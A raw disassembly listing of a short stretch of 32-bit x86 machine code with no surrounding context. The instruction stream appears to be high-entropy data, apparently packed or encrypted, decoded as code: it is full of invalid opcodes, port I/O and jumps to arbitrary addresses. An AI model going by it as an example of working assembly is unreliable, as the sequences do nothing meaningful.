  40ef1f:	sub    eax,0xe8c0bb42
  40ef24:	hlt    
  40ef25:	mov    bl,ch
  40ef27:	sbb    BYTE PTR [ecx-0x5183cd89],ah
  40ef2d:	and    edi,DWORD PTR [ecx]
  40ef2f:	or     edx,DWORD PTR [ebp+0x57]
  40ef32:	jae    0x40eef2
  40ef34:	jb     0x40ef36
  40ef36:	mov    cl,0xcd
  40ef38:	dec    ebx
  40ef39:	fsubrp st(5),st
  40ef3b:	aas    
  40ef3c:	sahf   
  40ef3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef3e:	imul   esi,DWORD PTR [edx-0x78],0xffffffa7
  40ef42:	mov    ds:0xa14df889,eax
  40ef47:	inc    esi
  40ef48:	cmp    BYTE PTR [edx+edi*2],ah
  40ef4b:	mov    ?,WORD PTR [ecx-0x4b]
  40ef4e:	adc    al,BYTE PTR [ebx-0x17d41967]
  40ef54:	test   DWORD PTR [esi+0x49],ecx
  40ef57:	cmc    
  40ef58:	(bad)  
  40ef59:	xchg   ebx,eax
  40ef5a:	lahf   
  40ef5b:	pushf  
  40ef5c:	jo     0x40eee3
  40ef5e:	das    
  40ef5f:	pop    esp
  40ef60:	jne    0x40ef62
  40ef62:	add    ebx,DWORD PTR [edi+0x63]
  40ef65:	xchg   ebx,eax
  40ef66:	pop    edi
  40ef67:	in     eax,0x74
  40ef69:	push   esi
  40ef6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef6b:	mov    cl,0xc8
  40ef6d:	mov    edx,0x9b92783a
  40ef72:	mov    ds:0xb0fac195,eax
  40ef77:	(bad)  
  40ef78:	sbb    eax,0xee7df7ff
  40ef7d:	imul   ebp,DWORD PTR [edx+0x48],0x8c5c8cee
  40ef84:	push   0xc1fadbf9
  40ef89:	push   esi
  40ef8a:	add    ch,BYTE PTR [ebx+edi*4-0x11071db9]
  40ef91:	cmp    eax,0xf46cee88
  40ef96:	push   eax
  40ef97:	cmp    al,0x88
  40ef99:	pop    ebp
  40ef9a:	stos   DWORD PTR es:[edi],eax
  40ef9b:	adc    al,0x37
  40ef9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef9e:	xor    edx,DWORD PTR [ebx]
  40efa0:	ds inc ebp
  40efa2:	adc    BYTE PTR [ebx-0x5f],0x8
  40efa6:	cmp    DWORD PTR [ebp+0x8f6cb55],ebp
  40efac:	pop    ebp
  40efad:	push   ecx
  40efae:	inc    ebp
  40efaf:	je     0x40efcc
  40efb1:	and    al,0xed
  40efb3:	imul   ebp,DWORD PTR [ebx],0xffffffd1
  40efb6:	jp     0x40ef7c
  40efb8:	or     bh,dl
  40efba:	mov    edi,DWORD PTR [ebx]
  40efbc:	add    ebx,DWORD PTR [edx+0x46]
  40efbf:	dec    ebx
  40efc0:	lods   eax,DWORD PTR ds:[esi]
  40efc1:	shl    esp,0x3b
  40efc4:	adc    al,0x36
  40efc6:	addr16 push edi
  40efc8:	push   ebp
  40efc9:	sbb    al,0x48
  40efcb:	repnz sub al,0x43
  40efce:	aam    0xbe
  40efd0:	fadd   DWORD PTR [edx+ebx*1-0x425ab0cf]
  40efd7:	mov    esi,0xae2f76b4
  40efdc:	adc    eax,0xc2c7648c
  40efe1:	bnd ja 0x40efed
  40efe4:	mov    dh,0x7a
  40efe6:	add    al,0xdf
  40efe8:	or     BYTE PTR [ebx+0x76],0xdf
  40efec:	inc    eax
  40efed:	or     al,BYTE PTR [edx]
  40efef:	xchg   edi,eax
  40eff0:	mov    esp,0xc71296c4
  40eff5:	adc    DWORD PTR [ebx-0x2f],ebp
  40eff8:	xor    esi,DWORD PTR [esi]
  40effa:	mov    WORD PTR [ecx+0x25],es
  40effd:	(bad)  
  40efff:	call   0x8ae8bb7e
  40f004:	test   DWORD PTR [edx],esi
  40f006:	mov    al,ds:0x78353d86
  40f00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f00c:	mov    BYTE PTR [eax],0xa5
  40f00f:	adc    cl,BYTE PTR [esi+esi*8-0x18c827d9]
  40f016:	adc    eax,0xeec9036c
  40f01b:	sbb    BYTE PTR [esi+0x31],cl
  40f01e:	xchg   esi,eax
  40f01f:	xchg   esi,eax
  40f020:	lods   eax,DWORD PTR ds:[esi]
  40f021:	cld    
  40f022:	stos   BYTE PTR es:[edi],al
  40f023:	and    DWORD PTR [ebx-0x252498e],eax
  40f029:	sub    eax,0xe20da8b
  40f02e:	pop    edx
  40f02f:	ins    DWORD PTR es:[edi],dx
  40f030:	rcl    DWORD PTR [ebx-0x62],cl
  40f033:	fldl2e 
  40f035:	sbb    ebx,DWORD PTR [ebx+0x2c]
  40f038:	push   ds
  40f039:	test   al,0x19
  40f03b:	and    eax,0x9ec3c6d6
  40f040:	xchg   edi,eax
  40f041:	daa    
  40f042:	or     DWORD PTR [ecx],esi
  40f044:	mov    al,ds:0xdc01c51b
  40f049:	ror    DWORD PTR [edi+eax*2+0x7b],1
  40f04d:	popf   
  40f04e:	je     0x40f04f
  40f050:	sub    bh,BYTE PTR [edx-0x27]
  40f053:	call   0x9bcc:0xd865672e
  40f05a:	add    eax,0x1024cb8e
  40f05f:	ja     0x40f07c
  40f061:	bound  ebp,QWORD PTR [ebx]
  40f063:	and    esp,DWORD PTR [edi]
  40f065:	jns    0x40f068
  40f067:	mov    dl,0x10
  40f069:	mov    al,ds:0xb6397764
  40f06e:	pop    esi
  40f06f:	loop   0x40f093
  40f071:	dec    eax
  40f072:	je     0x40f0eb
  40f074:	fs or  eax,0x425201d3
  40f07a:	mov    ecx,0x4b8b61d8
  40f07f:	inc    ebp
  40f080:	jnp    0x40f0e0
  40f082:	dec    esp
  40f083:	xor    ebp,DWORD PTR [edi+esi*8-0x5e]
  40f087:	ja     0x40f104
  40f089:	or     bl,BYTE PTR [ebx-0x7d]
  40f08c:	jnp    0x40f086
  40f08e:	jo     0x40f0ae
  40f090:	pop    ebp
  40f091:	iret   
  40f092:	mov    ebp,0xf270c331
  40f097:	xor    eax,0xe7b6e2e2
  40f09c:	push   ebx
  40f09d:	fnstcw WORD PTR [ecx-0x50]
  40f0a0:	dec    edi
  40f0a1:	cmp    BYTE PTR [edi+0x23],ah
  40f0a4:	push   0xacd0086f
  40f0a9:	adc    BYTE PTR [eax+0xe],0xd6
  40f0ad:	mov    edi,0x81047b16
  40f0b2:	jmp    0xc0974af1
  40f0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0b8:	pop    esi
  40f0b9:	push   ss
  40f0ba:	jns    0x40f07b
  40f0bc:	or     BYTE PTR [edi+0x6b8d16e0],ah
  40f0c2:	dec    ecx
  40f0c3:	jne    0x40f12e
  40f0c5:	test   cl,ah
  40f0c7:	dec    esi
  40f0c8:	call   0x87729974
  40f0cd:	xor    DWORD PTR [ebx],ebp
  40f0cf:	dec    edx
  40f0d0:	mov    bh,0x1c
  40f0d2:	test   DWORD PTR [ebp+0x5c],edi
  40f0d5:	xchg   al,al
  40f0d7:	and    eax,0xf022695
  40f0dc:	and    esp,eax
  40f0de:	pop    esi
  40f0df:	jbe    0x40f115
  40f0e1:	sahf   
  40f0e2:	out    0x33,al
  40f0e4:	mov    eax,DWORD PTR [edi+0x53]
  40f0e7:	(bad)  
  40f0e8:	jo     0x40f0b8
  40f0ea:	test   al,dl
  40f0ec:	mov    edx,0xcc606170
  40f0f1:	std    
  40f0f2:	and    ecx,DWORD PTR [edi+ecx*8+0x2a76fa05]
  40f0f9:	cdq    
  40f0fa:	push   es
  40f0fb:	daa    
  40f0fc:	cld    
  40f0fd:	sbb    dl,BYTE PTR [esi-0x24136d4]
  40f103:	cmp    DWORD PTR [ebx+0xff81a8f],ecx
  40f109:	out    dx,al
  40f10a:	mov    ebp,DWORD PTR [ebx]
  40f10c:	gs cmp al,0x8e
  40f10f:	fnstsw WORD PTR [edi-0x365f9235]
  40f115:	push   ecx
  40f116:	cmc    
  40f117:	jnp    0x40f0d4
  40f119:	mov    ds:0x933765ec,al
  40f11e:	push   cs
  40f11f:	inc    edx
  40f120:	call   0x7364:0x858c8fe2
  40f127:	(bad)  
  40f128:	(bad)  
  40f129:	xchg   ebp,eax
  40f12a:	sbb    bh,dl
  40f12c:	ret    
  40f12d:	les    ebp,FWORD PTR [edx-0x56d65ffd]
  40f133:	mov    ebx,0xca5feb8c
  40f138:	(bad)  [eax]
  40f13a:	repz pop ss
  40f13c:	xlat   BYTE PTR ds:[ebx]
  40f13d:	and    eax,0x9cea1847
  40f142:	das    
  40f143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f145:	or     dl,BYTE PTR [ebp+0x4b]
  40f148:	int    0x2c
  40f14a:	jnp    0x40f138
  40f14c:	int    0x79
  40f14e:	or     esp,eax
  40f150:	cmp    DWORD PTR [edx],ecx
  40f152:	popf   
  40f153:	stc    
  40f154:	cmp    DWORD PTR [esi+0x625ea6a2],esi
  40f15a:	mov    al,ds:0xe93e690b
  40f15f:	jp     0x40f116
  40f161:	mov    al,ds:0x8d2f4ce2
  40f166:	stos   DWORD PTR es:[edi],eax
  40f167:	fcomip st,st(7)
  40f169:	lahf   
  40f16a:	fs sbb esi,esp
  40f16d:	jo     0x40f19e
  40f16f:	jge    0x40f1df
  40f171:	iret   
  40f172:	aaa    
  40f173:	pop    ebx
  40f174:	out    0xc0,eax
  40f176:	sbb    eax,0x35aef71b
  40f17b:	sbb    al,0x59
  40f17d:	out    0x6f,eax
  40f17f:	je     0x40f1c9
  40f181:	mov    ebx,0x4ed3d55c
  40f186:	push   0x6af500c4
  40f18b:	aam    0x2d
  40f18d:	lea    ebx,[ecx-0x1824b6d2]
  40f193:	cmp    BYTE PTR [ebp+0xd],ah
  40f196:	mov    dl,0x9a
  40f198:	inc    esi
  40f199:	out    0x79,al
  40f19b:	pop    edx
  40f19c:	(bad)  [eax]
  40f19e:	or     eax,0x6b6aa334
  40f1a3:	push   0x14
  40f1a5:	dec    eax
  40f1a6:	add    ah,BYTE PTR [ebx]
  40f1a8:	mov    ds:0xa1e951e0,eax
  40f1ad:	mov    al,ds:0xec4b0e9
  40f1b2:	pop    edi
  40f1b3:	pop    edi
  40f1b4:	shr    DWORD PTR [esi-0x5ad46f41],cl
  40f1ba:	jbe    0x40f226
  40f1bc:	push   ebp
  40f1bd:	xchg   esi,eax
  40f1be:	out    0xb5,al
  40f1c0:	push   eax
  40f1c1:	pop    edi
  40f1c2:	mov    edx,0x81ea1e6c
  40f1c7:	stc    
  40f1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1c9:	xor    edx,DWORD PTR [esi-0x20]
  40f1cc:	add    ah,0x8e
  40f1cf:	xor    eax,0x5e34086
  40f1d4:	push   edx
  40f1d5:	cmp    eax,0x98ba1650
  40f1da:	lds    edi,FWORD PTR [edi-0x7]
  40f1dd:	bound  eax,QWORD PTR [edi]
  40f1df:	test   DWORD PTR [eax-0x46],edx
  40f1e2:	pusha  
  40f1e3:	bound  esp,QWORD PTR [edi-0x7f]
  40f1e6:	add    eax,0x156d1750
  40f1eb:	scas   eax,DWORD PTR es:[edi]
  40f1ec:	hlt    
  40f1ed:	cld    
  40f1ee:	popf   
  40f1ef:	mov    ds:0x3be14e03,eax
  40f1f4:	(bad)  
  40f1f5:	ror    DWORD PTR [ebx+0x2a],cl
  40f1f8:	xchg   ebp,eax
  40f1f9:	mov    eax,0xfd7c208e
  40f1fe:	cmp    BYTE PTR [edi-0x63],bl
  40f201:	push   cs
  40f202:	push   ecx
  40f203:	retf   
  40f204:	inc    esp
  40f205:	pop    edx
  40f206:	bt     DWORD PTR [edi+0x7c17acc8],eax
  40f20d:	cmp    edx,DWORD PTR [edi+0x391ff8d9]
  40f213:	data16 jae 0x40f1e2
  40f216:	inc    ecx
  40f217:	dec    edi
  40f218:	cmp    BYTE PTR [ebx+0x5d71f285],dl
  40f21e:	mov    ch,0xdd
  40f220:	out    dx,al
  40f221:	or     DWORD PTR [eax],ebp
  40f223:	pop    eax
  40f224:	hlt    
  40f225:	push   edx
  40f226:	dec    edx
  40f227:	cmp    al,0x11
  40f229:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40f22b:	mov    BYTE PTR [eax-0x188c66f5],al
  40f231:	sub    dh,al
  40f233:	inc    esp
  40f234:	adc    cl,BYTE PTR [eax-0x76]
  40f237:	xor    al,0xff
  40f239:	adc    al,0xae
  40f23b:	rcr    DWORD PTR [esi+0x7d],cl
  40f23e:	mov    eax,0x8f947838
  40f243:	popf   
  40f244:	icebp  
  40f245:	mov    edi,0xe3b67a2c
  40f24a:	and    BYTE PTR [ecx-0x44b050d2],cl
  40f250:	push   0x68
  40f252:	cdq    
  40f253:	shl    DWORD PTR [edx+0x4f],cl
  40f256:	ds mov ebp,0xab970c97
  40f25c:	xor    eax,0x9a5cb948
  40f261:	je     0x40f20c
  40f263:	cmp    ebx,DWORD PTR [eax-0x55]
  40f266:	mov    ecx,0xa7e6591f
  40f26b:	xchg   ebp,eax
  40f26c:	jns    0x40f2b2
  40f26e:	xchg   DWORD PTR [ebx-0x6314a8ae],edx
  40f274:	inc    ecx
  40f275:	cmp    BYTE PTR [edx-0x4bd1a3cb],0x6b
  40f27c:	mov    al,0xbf
  40f27e:	dec    ebx
  40f27f:	pop    ecx
  40f280:	sub    DWORD PTR ds:0x9b326675,0xffffffb8
  40f287:	push   es
  40f288:	(bad)  
  40f289:	repz dec ebp
  40f28b:	scas   eax,DWORD PTR es:[edi]
  40f28c:	ret    0x91f6
  40f28f:	xchg   ebp,eax
  40f290:	ins    BYTE PTR es:[edi],dx
  40f291:	pusha  
  40f292:	mov    WORD PTR [eax+ebx*1-0x4d0a9727],es
  40f299:	inc    ecx
  40f29a:	aam    0x11
  40f29c:	adc    al,0x5b
  40f29e:	mov    ebx,0xa8a9bed8
  40f2a3:	mov    bh,0xa8
  40f2a5:	retf   0xc02e
  40f2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a9:	dec    BYTE PTR [edi-0x7e]
  40f2ac:	mov    edx,0x9f01ff90
  40f2b1:	out    0x7d,eax
  40f2b3:	loop   0x40f259
  40f2b5:	mov    edx,0xeba2e818
  40f2ba:	mov    WORD PTR [ecx+0x14],es
  40f2bd:	cmp    ah,dh
  40f2bf:	push   esi
  40f2c0:	stos   DWORD PTR es:[edi],eax
  40f2c1:	pop    esi
  40f2c2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40f2c4:	mov    DWORD PTR [ebx+ecx*1+0xb],esp
  40f2c8:	icebp  
  40f2c9:	aad    0x3e
  40f2cb:	scas   eax,DWORD PTR es:[edi]
  40f2cc:	mov    bh,0x9
  40f2ce:	call   0xe220f827
  40f2d3:	push   esi
  40f2d4:	jns    0x40f333
  40f2d6:	lahf   
  40f2d7:	xchg   ebp,eax
  40f2d8:	call   0x4057:0xccb17345
  40f2df:	into   
  40f2e0:	mov    ebx,0xec96dd9a
  40f2e5:	fisubr DWORD PTR [eax]
  40f2e7:	lock sbb dh,BYTE PTR [eax+ecx*4-0x5d]
  40f2ec:	add    al,0xca
  40f2ee:	push   ecx
  40f2ef:	cmp    edi,esi
  40f2f1:	es pushf 
  40f2f3:	or     eax,0x4516b790
  40f2f8:	gs mov bp,0xc561
  40f2fd:	shl    BYTE PTR [eax+0x51],1
  40f300:	cmp    dh,ch
  40f302:	(bad)  
  40f303:	jmp    0x40f301
  40f305:	nop
  40f306:	dec    ebx
  40f307:	test   BYTE PTR [esp+edi*8-0x9],0xde
  40f30c:	mov    ds:0xb0e485e9,al
  40f311:	sub    esp,eax
  40f313:	aad    0xe
  40f315:	repnz retf 0xd15d
  40f319:	inc    esp
  40f31a:	call   0x4d1d:0xc579f6b8
  40f321:	cld    
  40f322:	test   dh,ch
  40f324:	push   esp
  40f325:	jge    0x40f2b4
  40f327:	rcr    DWORD PTR [ecx],1
  40f329:	les    ebp,FWORD PTR [eax+ecx*2]
  40f32c:	and    dl,BYTE PTR [eax+eax*4]
  40f32f:	sbb    ecx,0xea7fb6f5
  40f335:	rol    BYTE PTR [eax-0x2b],cl
  40f338:	push   esi
  40f339:	shr    BYTE PTR [esi+0xf],0x4d
  40f33d:	mov    ds:0x7feb4245,al
  40f342:	jo     0x40f350
  40f344:	push   ecx
  40f345:	cmp    al,0xcd
  40f347:	xor    bh,cl
  40f349:	scas   eax,DWORD PTR es:[edi]
  40f34a:	div    DWORD PTR [eax+0x3c]
  40f34d:	lock and eax,0x1a31c9ac
  40f353:	push   ss
  40f354:	jecxz  0x40f3b5
  40f356:	fcomp  DWORD PTR [ecx-0x2398b9ef]
  40f35c:	test   al,0x9a
  40f35e:	cmp    al,0x3e
  40f360:	adc    DWORD PTR [ebx],ebp
  40f362:	ja     0x40f3ba
  40f364:	mov    WORD PTR [edi],?
  40f366:	mov    ebp,0x1d34c418
  40f36b:	shl    dh,1
  40f36d:	or     DWORD PTR [edx+0x4566b794],edi
  40f373:	test   al,0xc0
  40f375:	popa   
  40f376:	dec    ebx
  40f377:	lods   eax,DWORD PTR ds:[esi]
  40f378:	mov    DWORD PTR [edx],ecx
  40f37a:	(bad)  
  40f37b:	mov    edi,0xcc9f97e3
  40f380:	rol    BYTE PTR [ecx],cl
  40f382:	iret   
  40f383:	cdq    
  40f384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f386:	fcmovbe st,st(3)
  40f388:	mov    ah,0x4c
  40f38a:	cmp    esp,edx
  40f38c:	mov    ds:0x51d28880,eax
  40f391:	stos   DWORD PTR es:[edi],eax
  40f392:	test   al,0xbb
  40f394:	pop    esi
  40f395:	mov    esp,DWORD PTR [edx]
  40f397:	repnz push ebx
  40f399:	push   ds
  40f39a:	adc    eax,0xa1b81b1e
  40f39f:	out    dx,eax
  40f3a0:	stc    
  40f3a1:	loopne 0x40f33f
  40f3a3:	test   DWORD PTR [edi-0x187e3a95],ebx
  40f3a9:	mov    ebx,0x5d28a494
  40f3ae:	pop    eax
  40f3af:	mov    BYTE PTR [edi+edi*1+0xd],dh
  40f3b3:	imul   edx,ebp,0x16de0de5
  40f3b9:	retf   
  40f3ba:	xchg   esi,eax
  40f3bb:	fld    QWORD PTR [esi+esi*8+0x41]
  40f3bf:	and    DWORD PTR [edi-0x73],eax
  40f3c2:	push   ss
  40f3c3:	pushf  
  40f3c4:	or     al,0x5d
  40f3c6:	push   esp
  40f3c7:	adc    ecx,DWORD PTR [eax]
  40f3c9:	mov    ebp,DWORD PTR [edx]
  40f3cb:	xchg   ecx,eax
  40f3cc:	cli    
  40f3cd:	dec    esp
  40f3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3cf:	push   esp
  40f3d0:	inc    ebx
  40f3d1:	xlat   BYTE PTR ds:[ebx]
  40f3d2:	pop    esp
  40f3d3:	xor    bl,BYTE PTR [ebx-0x1c]
  40f3d6:	enter  0x8f91,0xc9
  40f3da:	push   edi
  40f3db:	mov    ecx,0xb53c75f3
  40f3e0:	and    dl,dh
  40f3e2:	les    ebx,FWORD PTR [eax+0x7c6dd711]
  40f3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e9:	aad    0xb8
  40f3eb:	scas   eax,DWORD PTR es:[edi]
  40f3ec:	mov    eax,0x524377f8
  40f3f1:	aad    0xe4
  40f3f3:	or     al,0xf0
  40f3f5:	mov    DWORD PTR [ebx+0x2429fdae],ecx
  40f3fb:	push   ebx
  40f3fc:	shl    BYTE PTR [ecx+eiz*4],0xb5
  40f400:	call   0x3cd62646
  40f405:	stc    
  40f406:	push   edx
  40f407:	outs   dx,BYTE PTR ds:[esi]
  40f409:	jle    0x40f3bf
  40f40b:	add    esp,DWORD PTR [edx+0x674d6cbc]
  40f411:	inc    edi
  40f412:	(bad)  
  40f414:	mov    cl,0xe4
  40f416:	loope  0x40f45e
  40f418:	leave  
  40f419:	cmp    ebx,DWORD PTR [ebx]
  40f41b:	xchg   esi,eax
  40f41c:	pop    ss
  40f41d:	mov    ds:0x7b648627,eax
  40f422:	pop    ss
  40f423:	pusha  
  40f424:	icebp  
  40f425:	arpl   WORD PTR [esi+eiz*1],dx
  40f428:	add    BYTE PTR [edi+0x338a79af],al
  40f42e:	aad    0xd9
  40f430:	lds    ebp,FWORD PTR [edi-0x4b]
  40f433:	fstp   TBYTE PTR [edx]
  40f435:	popf   
  40f436:	mov    dl,0x91
  40f438:	sbb    eax,0x2ebb2f3f
  40f43d:	fisttp QWORD PTR [ebp+0x3b]
  40f440:	xchg   edx,eax
  40f441:	aad    0x78
  40f443:	das    
  40f444:	inc    BYTE PTR [edx+0x67df0f4c]
  40f44a:	fs sahf 
  40f44c:	pop    ss
  40f44d:	shl    DWORD PTR [esi-0x9],cl
  40f450:	inc    esi
  40f451:	int3   
  40f452:	dec    esp
  40f453:	clc    
  40f454:	push   ecx
  40f455:	in     eax,0x33
  40f457:	shr    BYTE PTR gs:[ecx],1
  40f45a:	sub    dl,dl
  40f45c:	aam    0x6c
  40f45e:	adc    eax,0xf4e1e72d
  40f463:	call   0x7189:0x495375c6
  40f46a:	and    DWORD PTR [edx+0x7087ddef],esi
  40f470:	pop    ds
  40f471:	leave  
  40f472:	pop    ebx
  40f473:	push   0xffffffe8
  40f475:	mov    ecx,0x2a20025f
  40f47a:	dec    ebp
  40f47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f47c:	retf   0x5f2e
  40f47f:	xchg   edi,eax
  40f480:	test   al,0xe0
  40f482:	push   0x22
  40f484:	popf   
  40f485:	daa    
  40f486:	xor    DWORD PTR [edx-0x7c],edx
  40f489:	jbe    0x40f429
  40f48b:	lods   al,BYTE PTR ds:[esi]
  40f48c:	mov    esi,0x555e0b2f
  40f491:	(bad)  
  40f492:	mov    ebp,DWORD PTR [ecx-0x1fce0fa2]
  40f498:	fisub  WORD PTR [edi]
  40f49a:	dec    ebp
  40f49b:	lods   al,BYTE PTR ds:[esi]
  40f49c:	xlat   BYTE PTR ds:[ebx]
  40f49d:	push   0xffffff9e
  40f49f:	aaa    
  40f4a0:	mov    ds:0x1d89fe66,eax
  40f4a5:	adc    BYTE PTR [ebx+0x7d934921],ch
  40f4ab:	xchg   edx,eax
  40f4ac:	inc    edx
  40f4ad:	mov    ecx,0x5b481aa
  40f4b2:	popa   
  40f4b3:	inc    DWORD PTR [eax+eax*1]
  40f4b6:	jb     0x40f51b
  40f4b8:	mov    ch,0xe5
  40f4ba:	stc    
  40f4bb:	add    al,0x2e
  40f4bd:	cmp    eax,0xd3b12931
  40f4c2:	fsubr  st,st(0)
  40f4c4:	stc    
  40f4c5:	pop    ds
  40f4c6:	dec    esp
  40f4c7:	enter  0x4965,0xc
  40f4cb:	out    0x6b,al
  40f4cd:	jmp    esp
  40f4cf:	add    eax,0xd6815fc0
  40f4d4:	lds    edx,FWORD PTR [edi]
  40f4d6:	ret    0xa67c
  40f4d9:	popa   
  40f4da:	das    
  40f4db:	ins    BYTE PTR es:[edi],dx
  40f4dc:	or     eax,0xf90a2d0b
  40f4e1:	add    bh,BYTE PTR ds:[ecx-0x68]
  40f4e5:	mov    ah,0xca
  40f4e7:	and    BYTE PTR [edi-0x47],0x8a
  40f4eb:	sbb    BYTE PTR [ebx],ch
  40f4ed:	imul   esp,eax,0x7921e01f
  40f4f3:	jge    0x40f52f
  40f4f5:	dec    eax
  40f4f6:	shl    BYTE PTR [esi+eiz*4],0x8e
  40f4fa:	retf   0x4a4a
  40f4fd:	je     0x40f492
  40f4ff:	nop
  40f500:	mov    al,ds:0x6891b3b4
  40f505:	(bad)  
  40f506:	fistp  QWORD PTR [ebx+0x18a15b76]
  40f50c:	cmp    DWORD PTR [esi-0xc48f5dc],esi
  40f512:	or     BYTE PTR [esi-0x72],0x56
  40f516:	ret    
  40f517:	jp     0x40f4f4
  40f519:	xor    eax,0x4705076
  40f51e:	or     eax,0x60fee060
  40f523:	int    0xb5
  40f525:	fstp   TBYTE PTR [ecx+0x494aa34c]
  40f52b:	mov    ah,cl
  40f52d:	add    dl,BYTE PTR [ebp+0x53]
  40f530:	push   ecx
  40f531:	jmp    0x88051033
  40f536:	push   0x72aa45dc
  40f53b:	lahf   
  40f53c:	lahf   
  40f53d:	and    DWORD PTR [edx-0x7e8fc7d7],edx
  40f543:	and    DWORD PTR [esi],0x22
  40f546:	cmp    al,0xd4
  40f548:	pop    ss
  40f549:	jle    0x40f531
  40f54b:	sub    eax,0xbe01600f
  40f550:	out    dx,al
  40f551:	push   ebp
  40f552:	adc    BYTE PTR [esi],al
  40f554:	mov    eax,0x41ed38e9
  40f559:	dec    edx
  40f55a:	mov    BYTE PTR fs:[edi-0x22],al
  40f55e:	jb     0x40f5b6
  40f560:	aam    0x52
  40f562:	mov    cl,0xa0
  40f564:	xor    eax,0xbae06114
  40f569:	jbe    0x40f526
  40f56b:	cmp    cl,dh
  40f56d:	mov    esp,DWORD PTR [edx-0xea93c85]
  40f573:	jne    0x40f5c8
  40f575:	out    0x7b,eax
  40f577:	sbb    DWORD PTR [edi+edx*1],eax
  40f57a:	push   esp
  40f57b:	(bad)  
  40f57c:	jns    0x40f559
  40f57e:	mov    dh,BYTE PTR [edi]
  40f580:	jmp    0x8ee933d4
  40f585:	dec    edi
  40f586:	lock lahf 
  40f588:	inc    ecx
  40f589:	add    BYTE PTR [ebp-0x3d],ch
  40f58c:	xor    eax,DWORD PTR [eax]
  40f58e:	cld    
  40f58f:	xor    al,0xee
  40f591:	es mov cl,0xe6
  40f594:	int3   
  40f595:	adc    DWORD PTR [ebx+0x643b2d03],esi
  40f59b:	mov    esp,0xf46a7ce1
  40f5a0:	pop    ebp
  40f5a1:	add    eax,DWORD PTR [ebx+0x268eac8b]
  40f5a7:	mov    ecx,0x7cf2da9e
  40f5ac:	xchg   ecx,eax
  40f5ad:	mov    dh,0xc2
  40f5af:	mov    cl,0x58
  40f5b1:	loopne 0x40f612
  40f5b3:	lock xchg edx,eax
  40f5b5:	mov    WORD PTR [ebp+0x1f],?
  40f5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ba:	mov    cl,0x49
  40f5bc:	mov    bl,0xe4
  40f5be:	ss jae 0x40f5b0
  40f5c1:	das    
  40f5c2:	add    eax,0xe73202c4
  40f5c7:	rol    DWORD PTR [eax-0x44869eb5],1
  40f5cd:	mov    esi,0xb0db3ef4
  40f5d2:	sbb    ebp,DWORD PTR [ecx]
  40f5d4:	test   eax,0xac65f0c6
  40f5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5da:	jne    0x40f5ad
  40f5dc:	daa    
  40f5dd:	shl    edx,0xc6
  40f5e0:	adc    al,dh
  40f5e2:	jge    0x40f576
  40f5e4:	sbb    al,0x45
  40f5e6:	mov    edi,0x89be1f12
  40f5eb:	xchg   ecx,eax
  40f5ec:	xchg   DWORD PTR [ebp-0x33385e7a],esp
  40f5f2:	inc    ebp
  40f5f3:	mov    edx,0x4d5b2bc9
  40f5f8:	jb     0x40f60a
  40f5fa:	gs add eax,eax
  40f5fd:	(bad)  
  40f5fe:	int    0x14
  40f600:	mov    ds:0x3df46b79,al
  40f605:	xor    dl,BYTE PTR [edx]
  40f607:	cmp    BYTE PTR [ebp+0x66],ah
  40f60a:	ftst   
  40f60c:	sar    BYTE PTR [eax],cl
  40f60e:	add    bl,BYTE PTR [edx+0x6a3d5897]
  40f614:	sub    cl,al
  40f616:	mov    eax,0xc5d70da8
  40f61b:	mov    esp,0x8d06f887
  40f620:	scas   eax,DWORD PTR es:[edi]
  40f621:	iret   
  40f622:	bnd ret 0xbd68
  40f626:	xchg   ecx,eax
  40f627:	out    0x3,al
  40f629:	push   ecx
  40f62a:	jno    0x40f66a
  40f62c:	cli    
  40f62d:	add    BYTE PTR [esi],bl
  40f62f:	add    ah,ah
  40f631:	lahf   
  40f632:	jne    0x40f5ce
  40f634:	in     eax,0x56
  40f636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f637:	(bad)  
  40f639:	fidivr WORD PTR [ebx-0x7e03ce73]
  40f63f:	jo     0x40f6b3
  40f641:	icebp  
  40f642:	ret    0x897f
  40f645:	cmp    BYTE PTR [edx],ah
  40f647:	clc    
  40f648:	inc    edi
  40f649:	push   ecx
  40f64a:	or     edi,esp
  40f64c:	je     0x40f64f
  40f64e:	adc    BYTE PTR [ecx],bh
  40f650:	imul   ebx
  40f652:	scas   eax,DWORD PTR es:[edi]
  40f653:	inc    edi
  40f654:	fs call 0x9cb8f1f0
  40f65a:	lods   al,BYTE PTR ds:[esi]
  40f65b:	das    
  40f65c:	mov    edx,0x27beb2b3
  40f661:	push   esp
  40f662:	push   es
  40f663:	loopne 0x40f630
  40f665:	int    0xf3
  40f667:	rcl    DWORD PTR [ebp+esi*4-0x3f3d3908],1
  40f66e:	push   esp
  40f66f:	fsubr  DWORD PTR [edi-0x7b]
  40f672:	bound  esp,QWORD PTR [eax]
  40f674:	jnp    0x40f5f8
  40f676:	jbe    0x40f684
  40f678:	xor    DWORD PTR cs:[esi+edi*4+0x7419da85],edi
  40f680:	dec    esp
  40f681:	cmp    eax,DWORD PTR [edx]
  40f683:	shl    DWORD PTR [bp+si],1
  40f686:	jo     0x40f6c1
  40f688:	xchg   edi,eax
  40f689:	scas   al,BYTE PTR es:[edi]
  40f68a:	imul   edx,esi,0x31
  40f68d:	xchg   ebx,esi
  40f68f:	xchg   ecx,eax
  40f690:	xchg   ebp,eax
  40f691:	out    0x49,eax
